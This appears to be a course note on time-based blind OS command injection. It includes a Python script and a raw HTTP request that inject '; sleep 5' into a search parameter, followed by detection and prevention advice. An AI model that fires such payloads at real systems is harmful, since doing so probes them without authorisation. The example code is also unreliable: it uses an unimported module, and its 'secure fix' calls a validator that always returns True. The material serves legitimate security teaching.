---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## Implementing Time-Based OS Command Injection

### Background Theory

To implement Time-Based OS Command Injection, we need to understand the following concepts:

- **Command Execution**: How the application constructs and executes commands.
- **Input Validation**: The lack of proper validation that allows injection.
- **Time Delay**: Using time delays to confirm the injection.

### Step-by-Step Mechanics

Let's break down the process of implementing Time-Based OS Command Injection:

1. **Identify the Vulnerable Input Field**: Find an input field that is used to construct and execute a command.
2. **Inject a Time Delay Command**: Inject a command that introduces a time delay, such as `sleep 5`.
3. **Observe the Response Time**: Measure the response time of the application to confirm the injection.

### Complete Code Example

Here is a complete example of how to implement Time-Based OS Command Injection:

```python
import requests
from time import sleep

# Define the target URL
url = "http://example.com/search"

# Define the payload with a time delay command
payload = "; sleep 5"

# Construct the full URL with the payload
full_url = f"{url}?q={payload}"

# Send the request and measure the response time
start_time = time.time()
response = requests.get(full_url)
end_time = time.time()

# Calculate the response time
response_time = end_time - start_time

print(f"Response time: {response_time} seconds")
```

### Mermaid Diagram

Here is a mermaid diagram illustrating the process of Time-Based OS Command Injection:

```mermaid
sequenceDiagram
    participant User
    participant Application
    participant Server

    User->>Application: Send request with payload "; sleep 5"
    Application->>Server: Execute command with time delay
    Server-->>Application: Return response after delay
    Application-->>User: Display response
```

### Pitfalls and Common Mistakes

Common mistakes when implementing Time-Based OS Command Injection include:

- **Incorrect Payload**: Using a payload that does not introduce a time delay.
- **Improper Measurement**: Not accurately measuring the response time to confirm the injection.
- **Insufficient Testing**: Not thoroughly testing different scenarios to ensure the vulnerability exists.

### How to Prevent / Defend

#### Detection

To detect Time-Based OS Command Injection vulnerabilities, you can:

- **Automated Scanners**: Use tools like Burp Suite, OWASP ZAP, or Nessus to scan for vulnerabilities.
- **Manual Testing**: Manually test input fields by injecting time delay commands and observing the response time.

#### Prevention

To prevent Time-Based OS Command Injection, you can:

- **Input Validation**: Validate and sanitize all user inputs to ensure they do not contain malicious commands.
- **Use Safe APIs**: Use safe APIs that do not execute shell commands directly.
- **Least Privilege Principle**: Run the application with the least privileges necessary to minimize the impact of a successful injection.

#### Secure Coding Fixes

Here is an example of how to securely handle user input to prevent Time-Based OS Command Injection:

```python
import requests

# Define the target URL
url = "http://example.com/search"

# Define the user input
user_input = "safe_search_term"

# Validate and sanitize the user input
if validate_input(user_input):
    # Construct the full URL with the sanitized input
    full_url = f"{url}?q={user_input}"
    
    # Send the request
    response = requests.get(full_url)
else:
    print("Invalid input")

def validate_input(input):
    # Implement validation logic here
    return True  # Placeholder for actual validation logic
```

### Full HTTP Request and Response

Here is a complete example of the HTTP request and response for Time-Based OS Command Injection:

#### HTTP Request

```http
GET /search?q=%3B+sleep+5 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Content-Type: text/html
Content-Length: 1234

<!DOCTYPE html>
<html>
<head>
<title>Search Results</title>
</head>
<body>
<h1>Search Results</h1>
<p>No results found.</p>
</body>
</html>
```

### Expected Result

The expected result is a response time that is significantly longer due to the time delay introduced by the injected command.

---
<!-- nav -->
[[Web Security (PortSwigger)/10-OS Command Injection/03-Lab 2 Blind OS command injection with time delays/04-How to Prevent  Defend Against OS Command Injection|How to Prevent  Defend Against OS Command Injection]] | [[Web Security (PortSwigger)/10-OS Command Injection/03-Lab 2 Blind OS command injection with time delays/00-Overview|Overview]] | [[06-OS Command Injection with Time Delays|OS Command Injection with Time Delays]]
